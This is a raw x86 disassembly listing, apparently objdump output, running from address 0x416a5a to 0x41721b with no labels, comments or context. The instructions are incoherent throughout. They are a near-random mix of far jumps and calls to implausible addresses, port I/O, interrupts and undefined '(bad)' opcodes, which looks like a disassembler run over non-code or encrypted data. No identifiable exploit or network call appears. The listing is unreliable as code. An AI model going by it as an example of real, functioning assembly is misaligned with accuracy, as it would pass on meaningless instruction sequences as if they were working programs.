  416a5a:	enter  0x5f3,0x99
  416a5e:	or     bh,0x27
  416a61:	test   eax,0x4225882e
  416a66:	or     edx,DWORD PTR [ebx]
  416a68:	fdiv   QWORD PTR [edi+0x3a]
  416a6b:	imul   esp,DWORD PTR [ebp-0x70],0xffffffa3
  416a6f:	jae    0x416a34
  416a71:	clc    
  416a72:	push   ecx
  416a73:	fnstcw WORD PTR [ecx+eiz*1]
  416a76:	sub    DWORD PTR [ebx-0x60],eax
  416a79:	jg     0x416aa0
  416a7b:	int    0xf5
  416a7d:	cld    
  416a7e:	adc    esi,DWORD PTR [ebx]
  416a80:	push   ebp
  416a81:	jmp    0xa1b5:0x346df655
  416a88:	mov    dh,0xfe
  416a8a:	xchg   ebx,eax
  416a8b:	popf   
  416a8c:	call   0x76a1:0x888dba83
  416a93:	les    eax,FWORD PTR [ebp+0x2a0638c4]
  416a99:	xchg   BYTE PTR [eax-0x1b75e06f],bl
  416a9f:	jo     0x416b10
  416aa1:	sbb    esp,edx
  416aa3:	sbb    DWORD PTR [ecx],esi
  416aa5:	mov    cl,0x6c
  416aa7:	add    eax,DWORD PTR [edx+0x3749634f]
  416aad:	pop    edx
  416aae:	jmp    0xb4259c43
  416ab3:	add    DWORD PTR [edi+0x124a2c42],esi
  416ab9:	push   0x7d
  416abb:	idiv   DWORD PTR [eax-0x6e]
  416abe:	pop    esi
  416abf:	jl     0x416ae4
  416ac1:	jge    0x416a7c
  416ac3:	and    DWORD PTR [ecx],eax
  416ac5:	lods   al,BYTE PTR ds:[esi]
  416ac6:	movq   mm1,mm7
  416ac9:	lahf   
  416aca:	pop    edx
  416acb:	cld    
  416acc:	(bad)  
  416acd:	push   ecx
  416ace:	push   cs
  416acf:	(bad)  [ebx+0x59]
  416ad2:	ja     0x416aa3
  416ad4:	cmp    dl,BYTE PTR [ebx]
  416ad6:	rcr    BYTE PTR [esi],1
  416ad8:	push   edi
  416ad9:	lea    eax,[esi-0x4d]
  416adc:	dec    eax
  416add:	jnp    0x416a9f
  416adf:	leave  
  416ae0:	sbb    DWORD PTR [ebx],eax
  416ae2:	cs pop esi
  416ae4:	xchg   esi,eax
  416ae5:	loope  0x416af3
  416ae7:	out    0x91,eax
  416ae9:	repnz imul edx,DWORD PTR [ecx+0x3d],0xef347300
  416af1:	cmp    eax,0xa4cda42e
  416af6:	mov    eax,ds:0x69aa67d4
  416afb:	jmp    0xcd4e7a37
  416b00:	aad    0xb
  416b02:	retf   0x83cd
  416b05:	imul   edi,DWORD PTR [eax*1-0x975563b],0xf6e4d0c9
  416b10:	adc    esp,ebx
  416b12:	fstp   TBYTE PTR [ebx+0x12]
  416b15:	xchg   esi,eax
  416b16:	sbb    eax,0x319bf4b0
  416b1b:	aaa    
  416b1c:	push   edi
  416b1d:	xor    DWORD PTR [ebx],edx
  416b1f:	loop   0x416aa6
  416b21:	scas   al,BYTE PTR es:[edi]
  416b22:	jg     0x416b16
  416b24:	les    eax,FWORD PTR [ebp-0x66]
  416b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b28:	mov    DWORD PTR [edi],esi
  416b2a:	sbb    eax,DWORD PTR [ecx+esi*4+0x4aab4e81]
  416b31:	inc    ebp
  416b32:	outs   dx,BYTE PTR ds:[esi]
  416b33:	fsub   QWORD PTR [ebx+0x71]
  416b36:	pop    eax
  416b37:	call   esp
  416b39:	stos   DWORD PTR es:[edi],eax
  416b3a:	(bad)  
  416b3b:	sub    edi,ebx
  416b3d:	fnstcw WORD PTR [esp+eiz*4+0x10]
  416b41:	mov    edx,0x87f5d38a
  416b46:	lods   al,BYTE PTR ds:[esi]
  416b47:	xor    eax,ebx
  416b49:	jbe    0x416af5
  416b4b:	aaa    
  416b4c:	mov    al,ds:0x4a10811d
  416b51:	iret   
  416b52:	jmp    0x3b3c:0x456a8272
  416b59:	in     al,dx
  416b5a:	lds    ecx,FWORD PTR [ecx-0x58]
  416b5d:	daa    
  416b5e:	mov    ecx,0xca5f28f4
  416b63:	and    ecx,ebx
  416b65:	dec    esp
  416b66:	sub    BYTE PTR [eax-0x2],bl
  416b69:	lea    eax,[ebx]
  416b6b:	int3   
  416b6c:	cmp    eax,0x656697f4
  416b71:	loopne 0x416b8b
  416b73:	pop    ebp
  416b74:	stc    
  416b75:	dec    ebp
  416b76:	stos   DWORD PTR es:[edi],eax
  416b77:	sbb    dh,BYTE PTR ds:0x243933a4
  416b7d:	xchg   ebx,eax
  416b7e:	xchg   ebx,eax
  416b7f:	mov    eax,0x80509d2e
  416b84:	push   ecx
  416b85:	mov    ebp,0x8bab417b
  416b8a:	add    eax,0xe7fc06e8
  416b8f:	xchg   BYTE PTR [ebp+0x19],cl
  416b92:	cmp    ah,bh
  416b94:	shl    DWORD PTR [edx],1
  416b96:	in     al,dx
  416b97:	loopne 0x416b8e
  416b99:	shrd   DWORD PTR ds:0x294de6d4,edi,0xcb
  416ba1:	push   es
  416ba2:	push   0xffffffd2
  416ba4:	lods   eax,DWORD PTR ds:[esi]
  416ba5:	ret    0x5e07
  416ba8:	(bad)  
  416ba9:	shl    DWORD PTR [esi+0x17],1
  416bac:	cli    
  416bad:	mov    ch,0x3b
  416baf:	jecxz  0x416c06
  416bb1:	or     BYTE PTR [eax-0x1c9314f],0xc6
  416bb8:	dec    esi
  416bb9:	xchg   edx,eax
  416bba:	mov    al,0xab
  416bbc:	sub    eax,0xff7faa01
  416bc1:	rcl    BYTE PTR [eax-0x76],0x81
  416bc5:	xchg   ebp,eax
  416bc6:	xchg   al,ah
  416bc8:	imul   ecx,DWORD PTR [edx],0xca363760
  416bce:	jno    0x416c22
  416bd0:	adc    DWORD PTR [ebp+0x41],ebx
  416bd3:	retf   0xa7a7
  416bd6:	jne    0x416b84
  416bd8:	call   0x860d:0x390024fe
  416bdf:	sub    DWORD PTR [ebp+0x27e76ec3],ebp
  416be5:	mov    edi,0x9b654657
  416bea:	xchg   ecx,eax
  416beb:	xchg   BYTE PTR [ecx+0x1e1e91e9],bl
  416bf1:	sahf   
  416bf2:	add    esi,DWORD PTR [ecx]
  416bf4:	popa   
  416bf5:	inc    eax
  416bf6:	sti    
  416bf7:	mov    esp,0x290fbe5b
  416bfc:	push   eax
  416bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bfe:	push   cs
  416bff:	fsub   DWORD PTR [ebp+ebx*2+0x56]
  416c03:	in     eax,0x2f
  416c05:	lahf   
  416c06:	or     eax,0x965c1e65
  416c0b:	adc    DWORD PTR [ebp+0x11],esi
  416c0e:	pop    ecx
  416c0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c10:	icebp  
  416c11:	repnz cmp al,0x5c
  416c14:	retf   
  416c15:	ret    
  416c16:	outs   dx,DWORD PTR ds:[esi]
  416c17:	xchg   esi,eax
  416c18:	push   eax
  416c19:	(bad)  
  416c1a:	and    ebp,DWORD PTR [eax]
  416c1c:	push   esp
  416c1d:	and    cl,BYTE PTR [ebx]
  416c1f:	mov    cl,0x79
  416c21:	lds    ebx,FWORD PTR [eax+0xd]
  416c24:	mov    ebp,0x8114a70d
  416c29:	cmc    
  416c2a:	adc    ebx,esi
  416c2c:	pop    eax
  416c2d:	cwde   
  416c2e:	xor    al,0xf3
  416c30:	out    0x24,eax
  416c32:	imul   ecx,edi,0x4a9226f8
  416c38:	neg    BYTE PTR ds:0xd2b9cb5d
  416c3e:	cmp    al,0x5e
  416c40:	cli    
  416c41:	push   ss
  416c42:	and    eax,0x2990e9b3
  416c47:	pop    edx
  416c48:	je     0x416bca
  416c4a:	or     dh,dl
  416c4c:	inc    esp
  416c4d:	leave  
  416c4e:	push   ebp
  416c4f:	outs   dx,BYTE PTR ds:[esi]
  416c50:	loopne 0x416c99
  416c52:	mov    DWORD PTR [eax],ebp
  416c54:	out    dx,eax
  416c55:	jbe    0x416c1b
  416c57:	inc    esi
  416c58:	ror    BYTE PTR [eax],0xb3
  416c5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c5d:	cmp    ch,BYTE PTR [edx+esi*8-0x648cc0a8]
  416c64:	sub    al,0x28
  416c66:	fnstcw WORD PTR [ecx-0x66]
  416c69:	pop    es
  416c6a:	inc    esi
  416c6b:	sub    eax,0xd2383738
  416c70:	out    0x9c,al
  416c72:	ins    DWORD PTR es:[edi],dx
  416c73:	cmp    eax,0xd12612c4
  416c78:	xor    DWORD PTR [ebx-0x3872823b],ebx
  416c7e:	sub    DWORD PTR [eax+0x6d70dad6],edx
  416c84:	and    bh,cl
  416c86:	je     0x416ccd
  416c88:	mov    edi,es
  416c8a:	sub    BYTE PTR [edx+0x76f3901],bh
  416c90:	pop    ecx
  416c91:	inc    esi
  416c92:	xor    DWORD PTR [esi-0x49],esp
  416c95:	push   esp
  416c96:	add    al,0xc0
  416c98:	loop   0x416c5d
  416c9a:	push   ss
  416c9b:	ror    DWORD PTR [edi+0x640a31c],1
  416ca1:	mov    ch,0x2e
  416ca3:	fisubr DWORD PTR [ecx-0x3565b3b2]
  416ca9:	loopne 0x416c37
  416cab:	jbe    0x416ca6
  416cad:	ret    
  416cae:	sti    
  416caf:	mov    ebp,0xa54ad41a
  416cb4:	jno    0x416cf3
  416cb6:	mov    WORD PTR [eax+0x3],es
  416cb9:	cmp    DWORD PTR [edx+0x78578508],0x47455d88
  416cc3:	mov    ebp,0x82091ab9
  416cc8:	push   cs
  416cc9:	mov    dl,0xf1
  416ccb:	call   0x9416:0xd417d7f3
  416cd2:	inc    eax
  416cd3:	shr    BYTE PTR [esp+edx*8+0x21],0xb0
  416cd8:	sbb    edx,esi
  416cda:	gs es enter 0x794c,0x5b
  416ce0:	data16 aad 0x56
  416ce3:	mov    edx,0x193b49b1
  416ce8:	retf   
  416ce9:	mov    ah,BYTE PTR [ebx+0x5c]
  416cec:	imul   ebp,ecx,0x840bb77d
  416cf2:	mov    eax,ds:0x5f69c8f3
  416cf7:	retf   0x615
  416cfa:	jmp    0x427d:0x4fbca210
  416d01:	mov    BYTE PTR [esi-0x39],bl
  416d04:	loopne 0x416cca
  416d06:	or     esi,edi
  416d08:	neg    DWORD PTR [esi-0x4]
  416d0b:	out    0x1b,al
  416d0d:	pushf  
  416d0e:	mov    esi,0x701f09fc
  416d13:	pop    edx
  416d14:	lea    edi,[ebx+ebx*8]
  416d17:	xor    eax,0xd2eebaf3
  416d1c:	adc    al,0xa8
  416d1e:	jno    0x416cd3
  416d20:	mov    BYTE PTR [ecx-0x7b],dl
  416d23:	mov    al,ch
  416d25:	mov    al,ds:0xc7299f4d
  416d2a:	ins    BYTE PTR es:[edi],dx
  416d2b:	lahf   
  416d2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d2d:	test   BYTE PTR [ebp+0x3dd8b0ee],cl
  416d33:	sar    BYTE PTR [ebx+edx*8],0xbc
  416d37:	jl     0x416d5f
  416d39:	add    DWORD PTR [ebp-0x6b],eax
  416d3c:	add    DWORD PTR [edx],eax
  416d3e:	pop    ebp
  416d3f:	inc    esp
  416d40:	or     DWORD PTR [edx+eax*2],ebp
  416d43:	jge    0x416cd5
  416d45:	les    eax,FWORD PTR [ebx]
  416d47:	or     BYTE PTR [esi],cl
  416d49:	gs xchg edi,edi
  416d4c:	and    BYTE PTR [esi-0x59b59d73],dh
  416d52:	out    dx,al
  416d53:	ror    edx,cl
  416d55:	jae    0x416dac
  416d57:	cmovl  ebx,DWORD PTR [edi]
  416d5a:	hlt    
  416d5b:	add    eax,DWORD PTR [ecx+0x2077653]
  416d61:	mov    esi,0xbd849839
  416d66:	and    al,0x53
  416d68:	jp     0x416d4d
  416d6a:	(bad)  
  416d6b:	in     al,0x1b
  416d6d:	inc    esp
  416d6e:	mov    edi,edx
  416d70:	jge    0x416d02
  416d72:	push   eax
  416d73:	inc    edx
  416d74:	inc    eax
  416d75:	dec    ebx
  416d76:	test   al,0x4e
  416d78:	fisub  DWORD PTR [esi]
  416d7a:	mov    BYTE PTR [eax],dh
  416d7c:	or     BYTE PTR [edi+0xe],ch
  416d7f:	lahf   
  416d80:	sub    ebx,DWORD PTR [ebp-0x21]
  416d83:	dec    eax
  416d84:	sbb    DWORD PTR [esi-0x6d],esi
  416d87:	cli    
  416d88:	dec    ebx
  416d89:	push   ebx
  416d8a:	js     0x416d88
  416d8c:	daa    
  416d8d:	xchg   ebp,eax
  416d8e:	stos   DWORD PTR es:[edi],eax
  416d8f:	scas   al,BYTE PTR es:[edi]
  416d90:	dec    ecx
  416d91:	scas   al,BYTE PTR es:[edi]
  416d92:	int3   
  416d93:	jno    0x416d1b
  416d95:	xchg   esi,eax
  416d96:	mov    al,ds:0x12ebabab
  416d9b:	adc    eax,0xddec6ed
  416da0:	idiv   DWORD PTR [edx+edi*4+0x3d]
  416da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416da5:	mov    edi,0xa20c4f95
  416daa:	and    BYTE PTR [esi-0x139f38be],0x47
  416db1:	repz push 0xffffffb1
  416db4:	add    DWORD PTR [ecx],eax
  416db6:	mov    bl,0xa0
  416db8:	adc    DWORD PTR ds:0xd28e9468,edi
  416dbe:	cli    
  416dbf:	pop    eax
  416dc0:	jbe    0x416d9e
  416dc2:	push   ecx
  416dc3:	mov    ch,BYTE PTR [eax-0x39]
  416dc6:	dec    di
  416dc8:	sub    eax,0x1c851f7f
  416dcd:	sbb    al,BYTE PTR [eax]
  416dcf:	sbb    eax,0xe9de83b0
  416dd4:	fisubr WORD PTR [edi+0x65fcbed1]
  416dda:	cs dec si
  416ddd:	ret    
  416dde:	push   edi
  416ddf:	je     0x416e5a
  416de1:	lods   eax,DWORD PTR ds:[esi]
  416de2:	sub    DWORD PTR [ebx+0x643ab497],ebx
  416de8:	iret   
  416de9:	jnp    0x416d93
  416deb:	fdivrp st(0),st
  416ded:	inc    ecx
  416dee:	sbb    cl,0xbb
  416df1:	pop    eax
  416df2:	xchg   ecx,eax
  416df3:	or     ch,bl
  416df5:	std    
  416df6:	push   ss
  416df7:	fist   DWORD PTR [ebp-0x59]
  416dfa:	mov    ebx,0xf3f75ce1
  416dff:	or     ah,bh
  416e01:	inc    edx
  416e02:	sub    al,BYTE PTR [ebx+0x34be83e1]
  416e08:	inc    edi
  416e09:	int    0xa0
  416e0b:	or     eax,0xae6e0d6c
  416e10:	retf   
  416e11:	test   BYTE PTR [edi-0xf],dh
  416e14:	mov    bl,0x87
  416e16:	scas   eax,DWORD PTR es:[edi]
  416e17:	daa    
  416e18:	dec    esi
  416e19:	ret    0xfa39
  416e1c:	scas   eax,DWORD PTR es:[edi]
  416e1d:	popa   
  416e1e:	retf   
  416e1f:	or     eax,0x2e7e8ae2
  416e24:	(bad)  
  416e25:	dec    eax
  416e26:	test   eax,edx
  416e28:	loopne 0x416e8b
  416e2a:	ret    
  416e2b:	addr16 (bad) 
  416e2d:	stos   DWORD PTR es:[edi],eax
  416e2e:	push   ebp
  416e2f:	(bad)  [eax-0x18b53ca8]
  416e35:	jae    0x416dd2
  416e37:	jmp    0x416e57
  416e39:	hlt    
  416e3a:	aaa    
  416e3b:	push   ebx
  416e3c:	out    0x4a,al
  416e3e:	adc    eax,0xc8fc9b6d
  416e43:	lahf   
  416e44:	(bad)  
  416e45:	pop    eax
  416e46:	cmp    ch,BYTE PTR ds:0x8bf6a2fd
  416e4c:	je     0x416df0
  416e4e:	xor    edi,ebx
  416e50:	push   edi
  416e51:	sbb    BYTE PTR [ecx],al
  416e53:	sbb    DWORD PTR [eax+0x4efd9908],ebx
  416e59:	popf   
  416e5a:	xchg   edx,eax
  416e5b:	ficomp DWORD PTR [edx+ebp*2+0x45631e62]
  416e62:	je     0x416edb
  416e64:	(bad)  
  416e65:	test   eax,0x49e4e14f
  416e6a:	push   0x1031796d
  416e6f:	or     cl,dh
  416e71:	fstp   DWORD PTR [edx]
  416e73:	jmp    0x416e42
  416e75:	push   esp
  416e76:	pop    ebp
  416e77:	jp     0x416e52
  416e79:	inc    ebp
  416e7a:	aad    0x37
  416e7c:	xchg   BYTE PTR [ecx+0x71],dl
  416e7f:	test   dl,dl
  416e81:	jno    0x416e14
  416e83:	in     eax,dx
  416e84:	(bad)  
  416e86:	pop    edi
  416e87:	pop    es
  416e88:	clc    
  416e89:	stc    
  416e8a:	jbe    0x416e68
  416e8c:	(bad)  
  416e8d:	xlat   BYTE PTR ds:[ebx]
  416e8e:	sar    DWORD PTR [ecx-0x51],0x9c
  416e92:	xchg   edx,eax
  416e93:	jl     0x416e7c
  416e95:	cmp    al,0xf7
  416e97:	pmulhuw mm2,QWORD PTR [esi+edi*4-0x7]
  416e9c:	iret   
  416e9d:	mov    al,ds:0x5d9e24ed
  416ea2:	pop    es
  416ea3:	or     esi,DWORD PTR [ebp+0x4ea5db7f]
  416ea9:	adc    DWORD PTR [ecx*8-0x4caef366],esi
  416eb0:	jnp    0x416ea2
  416eb2:	pop    ebp
  416eb3:	push   ds
  416eb4:	adc    al,0xe2
  416eb6:	sbb    dl,BYTE PTR [eax-0x650e80bf]
  416ebc:	aas    
  416ebd:	jmp    0xcedef5b1
  416ec2:	xchg   BYTE PTR [eax+eiz*1+0x26],cl
  416ec6:	mov    bh,0x36
  416ec8:	dec    ecx
  416ec9:	xor    eax,edx
  416ecb:	gs inc ebx
  416ecd:	push   esi
  416ece:	int3   
  416ecf:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  416ed1:	dec    esi
  416ed2:	jge    0x416ed5
  416ed4:	mov    al,ds:0x9a4c8c10
  416ed9:	jns    0x416eaa
  416edb:	popf   
  416edc:	mov    eax,ds:0x5893c92c
  416ee1:	lods   al,BYTE PTR ds:[esi]
  416ee2:	push   ecx
  416ee3:	xor    al,0xfa
  416ee5:	pop    ss
  416ee6:	add    DWORD PTR [ecx],eax
  416ee8:	sub    al,0x4b
  416eea:	outs   dx,BYTE PTR ds:[esi]
  416eeb:	push   ecx
  416eec:	add    bl,cl
  416eee:	push   cs
  416eef:	shr    BYTE PTR [edx-0x10],0x84
  416ef3:	mov    ah,0x94
  416ef5:	jmp    0xea004cb0
  416efa:	push   ss
  416efb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416efc:	cdq    
  416efd:	cli    
  416efe:	xchg   DWORD PTR ds:0x139790f6,ebp
  416f04:	daa    
  416f05:	inc    esp
  416f06:	and    ebx,DWORD PTR [ecx+0x796542a8]
  416f0c:	xchg   ebx,eax
  416f0d:	sub    BYTE PTR [ebp+eiz*1+0x22b7c182],bl
  416f14:	out    0xe1,al
  416f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f17:	(bad)
  416f1b:	lahf   
  416f1c:	push   0x5dee484d
  416f21:	mov    cl,0x6
  416f23:	add    cl,0xae
  416f26:	cmc    
  416f27:	loope  0x416f61
  416f29:	and    esi,esi
  416f2b:	repz or DWORD PTR [eax+0x7f],edi
  416f2f:	fimul  WORD PTR [eax+0x78d9783b]
  416f35:	dec    esi
  416f36:	and    BYTE PTR [esp+edi*2],bl
  416f39:	push   esi
  416f3a:	ds dec edx
  416f3c:	das    
  416f3d:	out    dx,eax
  416f3e:	or     al,0x1c
  416f40:	dec    ebx
  416f41:	cmc    
  416f42:	inc    ebp
  416f43:	lds    edi,FWORD PTR ds:0x504624ca
  416f49:	adc    ebp,ebx
  416f4b:	mov    DWORD PTR [edi-0x56],ebp
  416f4e:	and    eax,ebp
  416f50:	mov    DWORD PTR [eax-0xc7e197d],edi
  416f56:	inc    ecx
  416f57:	or     BYTE PTR [esi],bl
  416f59:	jle    0x416f08
  416f5b:	test   al,0x1a
  416f5d:	jg     0x416fd5
  416f5f:	ins    DWORD PTR es:[edi],dx
  416f60:	hlt    
  416f61:	clc    
  416f62:	mov    DWORD PTR [edx+0xf],eax
  416f65:	jbe    0x416fe1
  416f67:	pop    ds
  416f68:	sti    
  416f69:	fdiv   QWORD PTR [esp+ecx*4+0x69ad3a96]
  416f70:	mov    al,0xbf
  416f72:	jge    0x416f9b
  416f74:	fist   WORD PTR [eax]
  416f76:	arpl   WORD PTR [eax-0x16387f6a],cx
  416f7c:	xor    ebp,DWORD PTR [ebx+0x21affce6]
  416f82:	sub    ch,cl
  416f84:	arpl   WORD PTR [ebx-0x4eaeee62],sp
  416f8a:	cmp    esi,DWORD PTR ds:0x28269732
  416f90:	(bad)  
  416f91:	dec    ecx
  416f92:	xor    eax,0x8b29d823
  416f97:	mov    bh,0x29
  416f99:	push   ebx
  416f9a:	sub    bl,BYTE PTR [ecx+0x4040fc19]
  416fa0:	lods   eax,DWORD PTR ds:[esi]
  416fa1:	pop    esp
  416fa2:	adc    bh,dh
  416fa4:	data16 mov ch,0xd
  416fa7:	cmp    eax,0x60dcf3cf
  416fac:	mov    bh,0xf1
  416fae:	js     0x416f8d
  416fb0:	xchg   ebx,eax
  416fb1:	mov    dl,0x8e
  416fb3:	imul   edi,ecx,0x5fc337ce
  416fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fba:	fstp   TBYTE PTR [esi]
  416fbc:	sub    eax,ecx
  416fbe:	sub    eax,0xc4616824
  416fc3:	in     al,dx
  416fc4:	rol    bl,1
  416fc6:	cli    
  416fc7:	out    dx,eax
  416fc8:	pop    esi
  416fc9:	add    al,al
  416fcb:	sbb    BYTE PTR [esp+eiz*8+0x1a],ch
  416fcf:	stos   BYTE PTR es:[edi],al
  416fd0:	stc    
  416fd1:	and    ch,BYTE PTR [ecx-0x4c9c71a4]
  416fd7:	jne    0x416f84
  416fd9:	pop    ebp
  416fda:	jmp    0x41702f
  416fdc:	jne    0x416f85
  416fde:	and    BYTE PTR [edi+0x5b],ch
  416fe1:	mov    DWORD PTR [edx],ebx
  416fe3:	pushf  
  416fe4:	xchg   BYTE PTR [eax],dh
  416fe6:	adc    ch,BYTE PTR [ebx-0x52e96fe0]
  416fec:	leave  
  416fed:	dec    edx
  416fee:	dec    esp
  416fef:	stos   DWORD PTR es:[edi],eax
  416ff0:	(bad)  
  416ff1:	outs   dx,DWORD PTR ds:[esi]
  416ff2:	jge    0x416f90
  416ff4:	call   0x53b:0x6b2ef0e2
  416ffb:	adc    BYTE PTR [esi],0x53
  416ffe:	aaa    
  416fff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417000:	pop    edi
  417001:	sub    DWORD PTR [esi-0x11eb422d],esi
  417007:	ror    DWORD PTR [ecx-0x170bf0ff],0xcc
  41700e:	mov    cs,WORD PTR [edx+0x6f38fb06]
  417014:	mov    DWORD PTR [eax-0x43397af6],eax
  41701a:	add    eax,0xfe9d332d
  41701f:	test   al,0x17
  417021:	add    DWORD PTR [ebp-0x79e2d649],ecx
  417027:	push   ebx
  417028:	push   es
  417029:	sbb    eax,0x8821222b
  41702e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41702f:	add    al,BYTE PTR [eax]
  417031:	sub    esp,edi
  417033:	aas    
  417034:	sahf   
  417035:	push   eax
  417036:	jl     0x41701b
  417038:	inc    esi
  417039:	mov    cs,WORD PTR [edi]
  41703b:	lds    ecx,FWORD PTR ds:0x1257d5a
  417041:	push   cs
  417042:	je     0x417038
  417044:	fisubr DWORD PTR [ecx]
  417046:	xchg   esi,eax
  417047:	xor    bh,BYTE PTR [edx-0x5dc27a11]
  41704d:	xor    al,0x80
  41704f:	shr    esi,1
  417051:	in     eax,0x6f
  417053:	repz test al,0x85
  417056:	xor    edx,ecx
  417058:	inc    edi
  417059:	and    DWORD PTR [ebx+0x66],0x7bbbb145
  417060:	cmp    cl,BYTE PTR [ebx-0x32]
  417063:	inc    esp
  417064:	in     eax,dx
  417065:	sbb    eax,0x334e362e
  41706a:	sub    al,0xb1
  41706c:	fsubr  QWORD PTR [eax-0x66]
  41706f:	shr    BYTE PTR [edx],1
  417071:	loop   0x4170c8
  417073:	add    eax,0xb881a3ef
  417078:	push   esp
  417079:	sub    bl,BYTE PTR [edx+0x4d]
  41707c:	repz fldln2 
  41707f:	push   ebx
  417080:	xchg   ebx,eax
  417081:	daa    
  417082:	sbb    ah,BYTE PTR [eax-0x75]
  417085:	push   ebx
  417086:	mov    eax,0xc43be845
  41708b:	imul   BYTE PTR [eax-0x2]
  41708e:	dec    esp
  41708f:	test   eax,0xd4e4f525
  417094:	mov    ecx,0x8b6208bd
  417099:	or     eax,DWORD PTR [esi+0x11]
  41709c:	mov    bh,0x8d
  41709e:	mov    esp,0x8ad75ff8
  4170a3:	xchg   DWORD PTR [eax-0x1d78cad7],eax
  4170a9:	cmc    
  4170aa:	xor    eax,0x1fc4799f
  4170af:	loop   0x41709e
  4170b1:	inc    ebx
  4170b2:	call   0xada85de4
  4170b7:	inc    ebx
  4170b8:	adc    DWORD PTR [ebx+0x73b158d2],ebp
  4170be:	(bad)  
  4170bf:	xchg   ebx,eax
  4170c0:	lock inc esi
  4170c2:	mov    DWORD PTR cs:[eax+0x20b90091],esi
  4170c9:	mov    edi,DWORD PTR [ebp+esi*2+0x4344c5bb]
  4170d0:	outs   dx,BYTE PTR ds:[esi]
  4170d1:	push   es
  4170d2:	xchg   esi,ebp
  4170d4:	test   DWORD PTR [eax],edi
  4170d6:	sub    ch,BYTE PTR [ecx+0x77c686b4]
  4170dc:	sub    esi,edx
  4170de:	daa    
  4170df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170e0:	mov    edx,0xaf159fd3
  4170e5:	sbb    DWORD PTR [edi-0x33cadd63],0xffffffa9
  4170ec:	jb     0x41715b
  4170ee:	pushf  
  4170ef:	retf   0xa316
  4170f2:	jl     0x417085
  4170f4:	adc    eax,0xbad22c4e
  4170f9:	and    ebx,esp
  4170fb:	pop    esi
  4170fc:	daa    
  4170fd:	adc    al,0xf5
  4170ff:	mov    al,ds:0xd0b73fed
  417104:	call   0x3988:0x4f9157f1
  41710b:	cmp    eax,0x1c5439aa
  417110:	mov    eax,0x94a91b3c
  417115:	cmp    al,0xf6
  417117:	leave  
  417118:	out    dx,al
  417119:	jecxz  0x4170fe
  41711b:	xchg   ebp,eax
  41711c:	pop    edi
  41711d:	cli    
  41711e:	out    0x99,eax
  417120:	mov    BYTE PTR [ecx+esi*1],cl
  417123:	jno    0x417159
  417125:	adc    eax,0xe2dbad87
  41712a:	bound  esi,QWORD PTR [ebx-0x7e314ebb]
  417130:	mov    ebp,0x6aa2fcea
  417135:	add    dl,0x5a
  417138:	and    BYTE PTR [esi-0x7ae55d47],dl
  41713e:	cmp    BYTE PTR [edx+edx*4],dh
  417141:	sbb    BYTE PTR [ecx],dl
  417143:	(bad)  
  417145:	jbe    0x417196
  417147:	jle    0x417190
  417149:	fisttp DWORD PTR [ebp+esi*2+0xf190a2a]
  417150:	add    eax,0xf98af3c7
  417155:	pop    ecx
  417156:	or     DWORD PTR [ebp-0x44],0x60
  41715a:	mov    bh,BYTE PTR cs:[eax-0x3a5bf3ca]
  417161:	bound  edi,QWORD PTR [edi-0xaf15bb7]
  417167:	jo     0x417190
  417169:	sbb    BYTE PTR [ecx],dl
  41716b:	dec    esi
  41716c:	cmp    ebx,DWORD PTR [ebx+0x39]
  41716f:	sti    
  417170:	test   edi,edi
  417172:	pop    ecx
  417173:	das    
  417174:	jb     0x417156
  417176:	les    edi,FWORD PTR [esi-0x26]
  417179:	xor    eax,0x6d82ae06
  41717e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41717f:	mov    al,0x4
  417181:	mov    cl,0xef
  417183:	stos   DWORD PTR es:[edi],eax
  417184:	xchg   eax,edi
  417186:	daa    
  417187:	push   edi
  417188:	push   ss
  417189:	mov    ecx,0xa3fd2a2c
  41718e:	push   ebp
  41718f:	outs   dx,BYTE PTR ds:[esi]
  417190:	and    DWORD PTR [edi+0x5d2cd113],edi
  417196:	jmp    0x59e0:0x5f1af29d
  41719d:	push   edx
  41719f:	add    BYTE PTR [ebx+ecx*4],0x91
  4171a3:	ins    DWORD PTR es:[edi],dx
  4171a4:	ret    0xc5c4
  4171a7:	xchg   DWORD PTR ds:0xbd12723e,ebx
  4171ad:	aaa    
  4171ae:	xlat   BYTE PTR ds:[ebx]
  4171af:	not    DWORD PTR [ebp-0x7b]
  4171b2:	push   edi
  4171b3:	(bad)  
  4171b4:	mov    al,ds:0x450fd442
  4171b9:	mov    eax,0x65061101
  4171be:	jnp    0x417184
  4171c0:	adc    DWORD PTR [edi+0x6a90027c],esi
  4171c6:	add    edx,DWORD PTR [edi]
  4171c8:	leave  
  4171c9:	loopne 0x4171a2
  4171cb:	add    DWORD PTR [ebx+0x32e5eb94],0x35
  4171d2:	pop    edx
  4171d3:	jmp    0x4171ba
  4171d5:	mov    ebp,DWORD PTR [edx+0x38d7cbf7]
  4171db:	je     0x417250
  4171dd:	add    BYTE PTR [esp+esi*2],bl
  4171e0:	rcl    BYTE PTR [esi-0x77],1
  4171e3:	ror    DWORD PTR [ebx+0x1c],cl
  4171e6:	inc    esp
  4171e7:	mov    eax,ds:0xf3afd3e
  4171ec:	xor    eax,DWORD PTR [eax+esi*4+0x60]
  4171f0:	push   esp
  4171f1:	mov    DWORD PTR [edx-0x383b4722],ecx
  4171f7:	sbb    cl,BYTE PTR [edi+esi*4]
  4171fa:	iret   
  4171fb:	add    al,cl
  4171fd:	cmp    DWORD PTR [eax],ebp
  4171ff:	cmp    dh,bh
  417201:	push   ds
  417202:	inc    esp
  417203:	sbb    al,BYTE PTR [ebp+0x42]
  417206:	xlat   BYTE PTR ds:[ebx]
  417207:	sbb    DWORD PTR [esi],edi
  417209:	fidiv  WORD PTR [edi-0x62c818ba]
  41720f:	cmp    DWORD PTR [eax-0x4c447b45],ecx
  417215:	mov    edx,0x129215d0
  41721a:	popa   
  41721b:	mov    ch,bh
